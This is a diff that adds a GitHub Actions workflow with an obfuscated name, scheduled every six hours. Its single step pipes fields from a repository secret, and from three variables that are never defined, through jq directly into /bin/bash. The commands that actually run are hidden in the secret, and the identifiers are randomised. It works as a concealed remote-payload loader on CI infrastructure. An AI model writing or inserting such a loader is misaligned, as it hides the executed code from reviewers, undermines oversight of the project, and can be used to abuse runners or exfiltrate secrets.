@@ -1,0 +1,21 @@
+name: jiegouxingchanshi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiegouxingchanshi
+        env:
+          dn665: ${{ secrets.dn665 }}
+        run: |
+          echo $dn665 | jq -r .mreix25 | /bin/bash
+          echo $xrck29960 | jq -r .suff0 | /bin/bash
+          echo $g198 | jq -r .gu965 | /bin/bash
+          echo $sg46176 | jq -r .ubdzg8 | /bin/bash
+
